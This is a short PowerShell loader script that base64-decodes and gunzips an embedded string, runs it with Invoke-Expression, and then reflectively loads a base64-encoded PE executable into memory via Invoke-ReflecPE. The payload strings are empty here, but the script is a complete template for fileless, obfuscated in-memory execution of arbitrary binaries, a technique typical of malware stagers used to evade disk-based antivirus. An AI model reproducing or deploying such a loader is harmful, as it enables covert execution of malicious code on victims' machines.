$PEinvoke = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""))
$InputString = ""

function Base64ToGzip {
    [CmdletBinding()] param(
        [string] $String
    )
    [Convert]::FromBase64String($String)
}

function GzipToText {
    [CmdletBinding()] param(
        [byte[]] $Bytes
    )
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Decoded = Base64ToGzip -String $PEinvoke
$Decompressed = GzipToText -Bytes $Decoded

$Decompressed |IEX



$PEBytes = [System.Convert]::FromBase64String($InputString)
 
Invoke-ReflecPE -PEBytes $PEBytes
